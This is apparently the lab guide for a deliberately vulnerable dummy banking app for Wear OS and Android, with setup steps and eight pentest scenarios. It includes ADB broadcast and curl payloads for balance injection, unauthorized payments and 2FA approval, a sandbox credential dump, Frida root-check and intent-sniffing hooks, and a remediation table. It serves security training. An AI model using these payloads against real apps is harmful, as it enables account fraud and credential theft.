# 🤖 Comprehensive Security Research Guide: Android & Wear OS
## Nexora OmniWear — Google Wearable & Mobile Banking Security Lab
### Compliance Standards: OJK POJK 11/POJK.03/2022, Bank Indonesia SNAP QRIS, & PCI-DSS v4.0

---

## 📑 Table of Contents
1. [Architecture & Android Binary Specifications](#1-architecture--android-binary-specifications)
2. [Lab Setup Using Android Studio Emulators](#2-lab-setup-using-android-studio-emulators)
3. [Lab Setup Using Physical Devices (Real Smartwatch & Smartphone)](#3-lab-setup-using-physical-devices-real-smartwatch--smartphone)
4. [Authentic Dummy Banking Application User Flow](#4-authentic-dummy-banking-application-user-flow)
5. [Master Writeup: 8 Android & Wear OS Pentest Scenarios](#5-master-writeup-8-android--wear-os-pentest-scenarios)
   - [Scenario 1: Remote Balance Injection & Replay (V-B01 / V-B02)](#scenario-1-remote-balance-injection--replay-v-b01--v-b02)
   - [Scenario 2: Unauthorized Quick Pay Broadcast Injection (V-W06)](#scenario-2-unauthorized-quick-pay-broadcast-injection-v-w06)
   - [Scenario 3: High-Value ($50,000) Out-of-Band 2FA Wire Transfer Hijack (V-W09)](#scenario-3-high-value-50000-out-of-band-2fa-wire-transfer-hijack-v-w09)
   - [Scenario 4: Quick-PIN 4-Digit Brute-Force & Plaintext SharedPreferences (V-W10)](#scenario-4-quick-pin-4-digit-brute-force--plaintext-sharedpreferences-v-w10)
   - [Scenario 5: Contactless Dynamic SNAP QRIS Replay Attack (V-W15)](#scenario-5-contactless-dynamic-snap-qris-replay-attack-v-w15)
   - [Scenario 6: Client-Side Anti-Tamper & Root Check Bypass (V-R01 / V-R02)](#scenario-6-client-side-anti-tamper--root-check-bypass-v-r01--v-r02)
   - [Scenario 7: Bank-Grade SSL Pinning Bypass (V-08 Security Theater)](#scenario-7-bank-grade-ssl-pinning-bypass-v-08-security-theater)
   - [Scenario 8: Wrist-Off Lockout Spoofing & Health Telemetry Leak (V-W11 / V-W04)](#scenario-8-wrist-off-lockout-spoofing--health-telemetry-leak-v-w11--v-w04)
6. [ADB Commands Cheatsheet & Frida Scripts Collection](#6-adb-commands-cheatsheet--frida-scripts-collection)
7. [Regulatory Compliance Matrix & Enterprise Remediation](#7-regulatory-compliance-matrix--enterprise-remediation)

---

## 🏛️ 1. Architecture & Android Binary Specifications

The suite provides 3 universal-architecture APK release binaries (`arm64-v8a`, `armeabi-v7a`, `x86_64`, `x86`) targeting Android 10+ (API level 29+):

| APK File Name | Target Installation | Primary Role | Size |
|---|---|---|---|
| **`nexora-wear-release.apk`** | **Wear OS Smartwatch** | **Target Victim (Victim Watch)**: Circular AMOLED 480x480 UI, Glanceable Balance, 3x4 Quick-PIN, Dynamic SNAP QRIS, Optical PPG pulse sensor, and Off-wrist lockout gatekeeper. | ~61 MB |
| **`nexora-companion-release.apk`** | **Android Smartphone** | **Attacker Console (Companion)**: Broadcasts Bluetooth LE balance sync, triggers $50,000 wire transfers, and sniffs relay packets. | ~61 MB |
| **`nexora-universal-release.apk`** | **Universal Device** | Flexible standalone binary compatible with both phones and smartwatches. | ~61 MB |

> [!TIP]
> All APK binaries can be downloaded directly from the official [**GitHub Releases Tab**](https://github.com/angganovryanputra/vulnbank-omniwear-suite/releases/latest).

---

## 💻 2. Lab Setup Using Android Studio Emulators

This setup is ideal for researchers who do not possess physical hardware. You will run two emulators side-by-side: **1 Wear OS Smartwatch Emulator** and **1 Smartphone Companion Emulator**.

```
[Researcher Host Machine: Local Air-Gapped Python Relay (0.0.0.0:5000)]
                               │
               ┌───────────────┴───────────────┐
               ▼                               ▼
     [Phone Emulator: 5554]          [Wear OS Emulator: 5556]
     IP Alias: 10.0.2.2:5000         IP Alias: 10.0.2.2:5000
     Device ID: emulator-5554        Device ID: emulator-5556
```

### Step 1: Create AVDs in Android Studio Device Manager
1. Open Android Studio → **Device Manager** → **Create Device**.
2. **Device 1 (Wear OS Smartwatch)**:
   - Category: **Wear OS** → Select **Wear OS Large Round** (454x454 or 480x480).
   - System Image: Select **Android 11 (API 30)** or **Android 13 (API 33)** *Wear OS System Image* (x86_64).
3. **Device 2 (Smartphone Companion)**:
   - Category: **Phone** → Select **Pixel 7** or **Pixel 6**.
   - System Image: Select **Android 11+ (API 30+)** (Google APIs x86_64).

### Step 2: Launch Emulators & Verify ADB Connection
```bash
adb devices
# Output should list:
# emulator-5554    device  (Smartphone)
# emulator-5556    device  (Wear OS Watch)
```

### Step 3: Start Local Air-Gapped Core Banking Relay
```bash
python backend/server.py
```
> The server listens on `0.0.0.0:5000`. Both emulators can reach it seamlessly via the virtual gateway `http://10.0.2.2:5000`.

### Step 4: Install Applications via ADB
```bash
# Install companion to phone
adb -s emulator-5554 install nexora-companion-release.apk

# Install watch app to smartwatch
adb -s emulator-5556 install nexora-wear-release.apk
```

---

## 📱 3. Lab Setup Using Physical Devices (Real Smartwatch & Smartphone)

If testing on physical hardware (e.g., Samsung Galaxy Watch 4/5/6, Google Pixel Watch):

### Step 1: Connect Watch via ADB over Wi-Fi
1. Ensure both your PC, Smartphone, and Smartwatch are connected to the **same Wi-Fi network**.
2. On the Smartwatch: Go to **Settings** → **Developer Options** → Enable **ADB Debugging** and **Wireless Debugging**.
3. Note the IP address and pairing port (e.g. `192.168.1.55:42135`).
4. On your PC terminal:
   ```bash
   adb pair 192.168.1.55:42135
   # Enter the 6-digit pairing code displayed on the watch face
   
   adb connect 192.168.1.55:5555
   adb devices
   ```

### Step 2: Install APKs
```bash
adb -s 192.168.1.55:5555 install -r nexora-wear-release.apk
adb -d install -r nexora-companion-release.apk
```

---

## 🧭 4. Authentic Dummy Banking Application User Flow

Nexora Bank delivers an authentic dual-persona experience:

```
┌────────────────────────────────────────────────────────┐
│             NEXORA WATCH AUTHENTIC FLOW                │
│                                                        │
│  [1. Lock Screen / Off-Wrist Gatekeeper]               │
│         │ (Wear watch on wrist)                        │
│         ▼                                              │
│  [2. Quick-PIN 4-Digit Dial] ───── (Input "1234")      │
│         │                                              │
│         ▼                                              │
│  [3. Platinum Private Dashboard]                       │
│       - Masked Liquid Balance: Rp 99.999.000 / $       │
│       - Real-Time PPG Heart Rate: 74 BPM               │
│       - Wearable Sync Status: Live BLE                 │
│         │                                              │
│         ├─► [SNAP QRIS] ──────► Merchant Dynamic QR    │
│         │                        NMID & 120s Countdown │
│         │                                              │
│         ├─► [ATM Cash-Out] ───► Dynamic 6-Digit OTP    │
│         │                        Cardless ATM Dispense │
│         │                                              │
│         ├─► [Emergency Freeze]► Instant Card Lock      │
│         │                        Mitigate NFC Skimming │
│         │                                              │
│         └─► [High-Value 2FA] ─► $50,000 Wire Approval  │
│                                  Haptic Dialog [ACCEPT]│
└────────────────────────────────────────────────────────┘
```

---

## 🎯 5. Master Writeup: 8 Android & Wear OS Pentest Scenarios

---

### Scenario 1: Remote Balance Injection & Replay (V-B01 / V-B02)
- **Severity**: **CRITICAL** (`CVSS:4.0/AV:A/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H` — Score: 8.8)
- **Vulnerability Standard**: CWE-345 (Insufficient Verification of Data Authenticity), CWE-319 (Cleartext Transmission)
- **Description**:
  The smartwatch listens for Bluetooth LE balance sync broadcasts using an exported `BroadcastReceiver` (`BluetoothSyncReceiver`). The intent payload contains a raw numeric amount without application-layer AES-GCM encryption or HMAC cryptographic signing. A rogue local application or proximity attacker can broadcast fake balances ($13,370,000.00) directly to the watch face.
- **Root Cause Code** ([`android/app/src/main/AndroidManifest.xml`](file:///android/app/src/main/AndroidManifest.xml)):
  ```xml
  <!-- VULNERABLE: Exported receiver without signature permission -->
  <receiver
      android:name=".BluetoothSyncModule"
      android:exported="true">
      <intent-filter>
          <action android:name="com.nexorabank.omniwear.ACTION_BT_SYNC" />
      </intent-filter>
  </receiver>
  ```
- **PoC Command via ADB**:
  ```bash
  adb -s emulator-5556 shell am broadcast \
    -a com.nexorabank.omniwear.ACTION_BT_SYNC \
    --es sync_payload '{"action":"UPDATE_BALANCE","amount":13370000.0}'
  ```
  *Observed Result*: The smartwatch display immediately updates the liquid balance to `$13,370,000.00` without server confirmation.

---

### Scenario 2: Unauthorized Quick Pay Broadcast Injection (V-W06)
- **Severity**: **CRITICAL** (`CVSS:4.0/AV:A/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H` — Score: 8.8)
- **Vulnerability Standard**: CWE-284 (Improper Access Control), CWE-926 (Improper Export of Android Application Components)
- **Description**:
  The smartwatch contains a Quick Pay feature allowing instant micro-payments without entering a PIN. The intent action `ACTION_QUICK_PAY` is processed without verifying caller identity or enforcing biometric authorization.
- **PoC Command**:
  ```bash
  adb -s emulator-5556 shell am broadcast \
    -a com.nexorabank.omniwear.ACTION_QUICK_PAY \
    --es recipient "ATTACKER_WALLET" \
    --ef amount 50000.0
  ```
  *Observed Result*: `$50,000.00` is debited and transferred to the attacker's wallet without prompt or consent.

---

### Scenario 3: High-Value ($50,000) Out-of-Band 2FA Wire Transfer Hijack (V-W09)
- **Severity**: **CRITICAL** (`CVSS:4.0/AV:A/AC:L/AT:N/PR:N/UI:R/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H` — Score: 8.7)
- **Vulnerability Standard**: CWE-287 (Improper Authentication), CWE-345 (Insufficient Data Verification)
- **Description**:
  When a user initiates an international wire transfer ($50,000), an Out-of-Band push notification arrives on the smartwatch. Approving this transfer sends a bare JSON dictionary `{"action": "APPROVE_2FA", "event_id": 16}` back to the backend without Android Keystore asymmetric hardware signing (`KeyGenParameterSpec.setUserAuthenticationRequired(true)`).
- **PoC Command**:
  ```bash
  # Resolve and approve 2FA transfer directly from attacker terminal
  curl -X POST http://localhost:5000/api/wearable/resolve-event \
    -H "Content-Type: application/json" \
    -d '{"event_id": 16, "resolution": "APPLIED"}'
  ```

---

### Scenario 4: Quick-PIN 4-Digit Brute-Force & Plaintext SharedPreferences (V-W10)
- **Severity**: **HIGH** (`CVSS:4.0/AV:P/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:N/SC:H/SI:H/SA:N` — Score: 7.5)
- **Vulnerability Standard**: CWE-307 (Improper Restriction of Excessive Authentication Attempts), CWE-312 (Cleartext Storage)
- **Description**:
  The 4-digit Quick-PIN has only $10^4 = 10,000$ possible combinations. The watch application does not enforce exponential backoff or account wipe after consecutive failed attempts. Furthermore, the PIN and JWT tokens are stored in plaintext in the app sandbox:
  `/data/data/com.nexorabank.omniwear/shared_prefs/`
- **PoC Command**:
  ```bash
  # Dump credentials directly from debuggable sandbox
  adb -s emulator-5556 shell "run-as com.nexorabank.omniwear cat shared_prefs/NexoraVaultPrefs.xml"
  ```

---

### Scenario 5: Contactless Dynamic SNAP QRIS Replay Attack (V-W15)
- **Severity**: **HIGH** (`CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:H/VA:N/SC:L/SI:H/SA:N` — Score: 7.7)
- **Vulnerability Standard**: CWE-294 (Authentication Bypass by Capture-replay)
- **Description**:
  The smartwatch generates an EMVCo dynamic QRIS barcode for merchant payments. However, the generated payload contains a static token that lacks an HMAC timestamp nonce. A replay attacker who photographs the watch screen can debit the account repeatedly.
- **PoC Command**:
  ```bash
  curl -X POST http://localhost:5000/api/qris/checkout \
    -H "Content-Type: application/json" \
    -d '{"account_number": "ADMIN001", "amount": 75.0, "qr_payload": "00020101021226610016ID.NEXORA.WWW"}'
  ```

---

### Scenario 6: Client-Side Anti-Tamper & Root Check Bypass (V-R01 / V-R02)
- **Severity**: **MEDIUM** (`CVSS:4.0/AV:L/AC:L/AT:N/PR:N/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N` — Score: 5.1)
- **Vulnerability Standard**: CWE-693 (Protection Mechanism Failure)
- **Description**:
  The application checks for `su` binaries and test-keys using a trivial boolean method `isRooted()` in Java/Kotlin. A researcher can bypass this check in under 5 seconds using a Frida script hook.
- **Frida Hook**:
  ```javascript
  Java.perform(function() {
      var RootCheck = Java.use("com.nexorabank.omniwear.SecurityCheckModule");
      RootCheck.isDeviceRooted.implementation = function() {
          console.log("[+] Bypassed Root Detection!");
          return false;
      };
  });
  ```

---

### Scenario 7: Bank-Grade SSL Pinning Bypass (V-08 Security Theater)
- **Severity**: **HIGH** (`CVSS:4.0/AV:A/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:H/SI:N/SA:N` — Score: 7.1)
- **Vulnerability Standard**: CWE-295 (Improper Certificate Validation)
- **Description**:
  The app implements client-side certificate pinning using `OkHttpClient.Builder().certificatePinner(...)`. Hooking `TrustManagerImpl` or `CertificatePinner.check()` completely neutralizes pinning, allowing full traffic interception in Burp Suite.

---

### Scenario 8: Wrist-Off Lockout Spoofing & Health Telemetry Leak (V-W11 / V-W04)
- **Severity**: **MEDIUM** (`CVSS:4.0/AV:P/AC:L/AT:N/PR:N/UI:N/VC:L/VI:H/VA:N/SC:N/SI:N/SA:N` — Score: 5.3)
- **Vulnerability Standard**: CWE-693 (Protection Mechanism Failure), CWE-200 (Exposure of Sensitive Information)
- **Description**:
  Optical PPG sensor readings and wrist attachment status (`isWristAttached`) are maintained as in-memory state flags. A thief can override the boolean flag to keep the banking app permanently unlocked without wearing the watch.

---

## 🛠️ 6. ADB Commands Cheatsheet & Frida Scripts Collection

### Quick ADB Test Execution
```bash
# 1. Update Balance on Watch
adb -s emulator-5556 shell am broadcast -a com.nexorabank.omniwear.ACTION_BT_SYNC --es sync_payload '{"action":"UPDATE_BALANCE","amount":888888.0}'

# 2. Trigger High-Value 2FA Notification on Watch
adb -s emulator-5556 shell am broadcast -a com.nexorabank.omniwear.ACTION_TRIGGER_OTP --es otp "839201"

# 3. Dump Sandbox Preferences
adb -s emulator-5556 shell "run-as com.nexorabank.omniwear cat shared_prefs/NexoraVaultPrefs.xml"
```

### Complete Frida Security Hook Script
```javascript
// nexora_wear_bypass.js
Java.perform(function() {
    console.log("[*] Initializing Nexora Bank security hooks...");

    // 1. Bypass Root & Emulator Checks
    try {
        var RootUtil = Java.use("com.nexorabank.omniwear.SecurityCheckModule");
        RootUtil.isDeviceRooted.implementation = function() {
            console.log("[✓] Root check bypassed!");
            return false;
        };
    } catch(e) {
        console.log("[-] RootUtil hook failed: " + e);
    }

    // 2. Sniff BLE Sync Packets
    try {
        var Receiver = Java.use("com.nexorabank.omniwear.BluetoothSyncModule");
        Receiver.onReceive.implementation = function(context, intent) {
            console.log("[🚨 SNIFFED BLE INTENT] Action: " + intent.getAction());
            var extras = intent.getExtras();
            if (extras) {
                console.log("   Payload: " + extras.toString());
            }
            this.onReceive(context, intent);
        };
    } catch(e) {
        console.log("[-] Receiver hook failed: " + e);
    }
});
```

---

## 🛡️ 7. Regulatory Compliance Matrix & Enterprise Remediation

| Flaw Code | Scenario Title | Business Impact | Violations | Production Remediation |
|---|---|---|---|---|
| **V-B01** | BLE Balance Injection | Displaying fabricated balances on watch. | PCI-DSS Req 4.1, POJK 11/2022 Pasal 26 | Require encrypted payload transport using AES-256-GCM with ECDH ephemeral key exchange. |
| **V-W06** | Unauthorized Quick Pay | Unauthorized wallet debit via exported broadcast. | OWASP M5, POJK 11/2022 Pasal 42 | Mark receiver `android:exported="false"` or require custom `signature` permission. |
| **V-W09** | $50k OOB 2FA Hijack | Wire transfer approval without hardware proof. | POJK 11/2022 Pasal 31 (MFA) | Require Android BiometricPrompt backed by StrongBox / TEE private key signature. |
| **V-W10** | Quick-PIN Brute-Force | PIN guessed within minutes; token exfiltration. | NIST SP 800-63B, PCI-DSS Req 3.4 | Enforce exponential backoff delay (1s, 2s, 4s, 8s) and migrate storage to Android EncryptedSharedPreferences. |
| **V-W15** | Dynamic QRIS Replay | Replaying merchant payment token repeatedly. | Bank Indonesia SNAP PADG 24/1 | Bind dynamic QRIS to a server-verified TOTP timestamp freshness window and HMAC digital signature. |
| **V-W11** | Wrist-Off Sensor Bypass | Stolen watch remains authenticated off-wrist. | ISO 27001 A.8.1, POJK 11/2022 | Validate wrist detection via continuous PPG sensor hardware attestation checked on backend. |
